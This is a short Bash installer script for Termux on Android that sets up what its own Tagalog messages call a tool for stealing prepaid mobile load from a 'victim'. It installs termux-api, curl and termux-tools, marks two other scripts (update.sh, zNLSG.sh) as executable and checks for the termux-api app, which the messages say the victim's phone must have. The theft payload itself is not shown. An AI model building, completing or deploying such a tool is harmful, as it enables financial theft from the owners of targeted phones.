#!/bin/bash
pkg install termux-api -y
pkg install curl -y
pkg install termux-tools -y
chmod +x update.sh
chmod +x zNLSG.sh
pm list packages -3 > log
grep "package:com.termux.api" log
if [ $? = 0 ]; then
echo -e "\e[92mPara makanakaw ka ng load. Siguraduhin nyo po na meron po yung biktima nyo termux-api na app. \e[0m"
elif [ $? = 1 ]; then
echo -e "\e[91mPara po makanakaw ka ng load. Siguraduhin nyo po na merong termux-api na app ang biktima nyo. Kung gusto nyo naman po subukan sa sarili nyo kung gumagana ba ang tool na gawa ko. Download nyo po ang termux-api na app. Wala po nyan sa Play Store. I-download nyo po sa apkpure.\e[0m"
fi
rm -f log
